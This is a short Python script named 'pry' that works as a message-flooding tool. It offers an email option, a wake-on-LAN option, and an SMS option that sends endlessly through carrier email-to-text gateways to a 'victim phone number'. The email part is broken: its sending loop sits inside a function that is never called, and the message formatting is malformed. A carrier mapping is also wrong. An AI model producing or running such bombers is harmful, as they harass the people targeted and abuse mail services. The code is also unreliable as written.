
import smtplib
import email
import wakeonlan
print("welcome to pry")
print("1) Email")
print("2) LAN ")
print("3) sms")
choice = input("choose an option: ")
if choice == ("1"):
  print("login below")
  mail = smtplib.SMTP('smtp.gmail.com:587')
  uname = input('enter email adress: ')
  pword = input('enter password: ')
  print("success")
  message = input("what you want to say: ")
  subject = input("enter the subject: ")
  msg = f'Subject: {subject}n/n/{message}'
  tget = input("enter target email:")
  def send():
    mail = smtplib.SMTP('smtp.gmail.com:587')   
    mail.ehlo()
    mail.starttls()
    mail.ehlo()
    mail.login(uname, pword)
    msg = f'Subject: {subject}n/n/{message}'
    mail.sendmail(uname, tget, msg)
    mail.close()
    while 1 == 1:
       send()
       print("success")
if  choice == ("2"):
 
  from wakeonlan import send_magic_packet
  macad = input("enter mac adress here: ")
  send_magic_packet(macad)
if choice == ("3"):
  uname = input('enter email adress: ')
  pword = input('enter password: ')
  message = input("enter text: ")
  num = input("victim phone number")
  server = smtplib.SMTP( "smtp.gmail.com", 587 )

  server.starttls()
  print("1) Verizon")
  print("2) Sprint")
  print("3) At and t")
  print("4) T mobile")
  carrier = input()
  if carrier == ("1"):
    carrierm = ("@vtext.com")
  elif carrier == ("2"):
    carrierm = ("@messaging.sprintpcs.com")
  elif carrier == ("3"):
    carrierm = ("@txt.att.net")
  elif carrier == ("4"):
    carrierm = ("@txt.att.net")
  server.login( uname,pword )
  while 1 == 1:
    server.sendmail( uname, num + carrierm, message )
    print("success")








